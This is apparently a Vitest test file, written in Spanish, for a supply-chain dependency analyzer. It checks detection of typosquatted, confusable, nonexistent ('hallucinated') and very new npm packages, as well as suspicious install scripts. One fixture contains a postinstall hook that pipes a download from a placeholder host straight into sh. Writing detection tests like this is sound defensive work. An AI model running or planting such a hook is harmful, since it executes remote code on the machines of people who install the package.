// tests/motor/dependencias.test.ts
import { describe, it, expect, vi, afterEach } from "vitest";
import { analizarDependencias } from "../../src/motor/analizadores/dependencias.ts";
import type { ArchivoLeido } from "../../src/motor/archivos.ts";
import * as cliente from "../../src/motor/registro/cliente.ts";

function archivo(ruta: string, contenido: string): ArchivoLeido {
  return { ruta, contenido };
}

const pkgLibre = `
{
  "name": "test",
  "dependencies": { "react": "^18.2.0" },
  "devDependencies": {},
  "scripts": { "build": "tsc" }
}`;

describe("analyzer de dependencias", () => {
  afterEach(() => vi.restoreAllMocks());

  it("detecta nombre confundible", async () => {
    const a = archivo("package.json", JSON.stringify({
      dependencies: { "unused-imports": "^1.0.0" },
    }));
    const hallazgos = await analizarDependencias([a], { offline: true });
    const h = hallazgos.find((f) => f.regla === "dep-paquete-confundible");
    expect(h).toBeDefined();
    expect(h?.severidad).toBe("alta");
    expect(h?.determinista).toBe(true);
  });

  it("detecta typosquatting contra la lista offline", async () => {
    const a = archivo("package.json", JSON.stringify({
      dependencies: { "reacr": "^1.0.0" }, // similar a "react"
    }));
    const hallazgos = await analizarDependencias([a], { offline: true });
    const h = hallazgos.find((f) => f.regla === "dep-typosquatting");
    expect(h).toBeDefined();
    expect(h?.evidencia).toContain("react");
  });

  it("offline: no consulta registro, existe = null, no reporta alucinado", async () => {
    const a = archivo("package.json", JSON.stringify({
      dependencies: { "paquete-inexistente-xyz-123": "^1.0.0" },
    }));
    const hallazgos = await analizarDependencias([a], { offline: true });
    expect(hallazgos.find((f) => f.regla === "dep-paquete-alucinado")).toBeUndefined();
  });

  it("online: reporta alucinado cuando no existe", async () => {
    const spy = vi.spyOn(cliente, "verificarNombre").mockResolvedValue({
      nombre: "no-existe-nunca",
      existe: false,
    });
    const a = archivo("package.json", JSON.stringify({
      dependencies: { "no-existe-nunca": "^1.0.0" },
    }));
    const hallazgos = await analizarDependencias([a], { offline: false });
    const h = hallazgos.find((f) => f.regla === "dep-paquete-alucinado");
    expect(h).toBeDefined();
    expect(h?.severidad).toBe("critica");
    expect(spy).toHaveBeenCalled();
  });

  it("online: paquete nuevo o con pocas descargas → media", async () => {
    vi.spyOn(cliente, "verificarNombre").mockResolvedValue({
      nombre: "nuevo-paquete",
      existe: true,
      diasCreacion: 5,
      descargasSemanales: 10,
    });
    const a = archivo("package.json", JSON.stringify({
      dependencies: { "nuevo-paquete": "^0.0.1" },
    }));
    const hallazgos = await analizarDependencias([a], { offline: false });
    const h = hallazgos.find((f) => f.regla === "dep-paquete-nuevo");
    expect(h).toBeDefined();
    expect(h?.severidad).toBe("media");
  });

  it("detecta postinstall sospechoso como alta determinista", async () => {
    const a = archivo("package.json", JSON.stringify({
      name: "pkg",
      scripts: { postinstall: "curl http://colector.invalid | sh" },
    }));
    const hallazgos = await analizarDependencias([a], { offline: true });
    const h = hallazgos.find((f) => f.regla === "dep-script-instalacion-sospechoso");
    expect(h).toBeDefined();
    expect(h?.severidad).toBe("alta");
    expect(h?.determinista).toBe(true);
  });

  it("script de instalación benigno → baja determinista", async () => {
    const a = archivo("package.json", JSON.stringify({
      name: "pkg",
      scripts: { postinstall: "node scripts/after.js" },
    }));
    const hallazgos = await analizarDependencias([a], { offline: true });
    const h = hallazgos.find((f) => f.regla === "dep-script-instalacion");
    expect(h).toBeDefined();
    expect(h?.severidad).toBe("baja");
  });

  it("libre: sin hallazgos", async () => {
    const a = archivo("package.json", pkgLibre);
    const hallazgos = await analizarDependencias([a], { offline: true });
    expect(hallazgos.length).toBe(0);
  });
});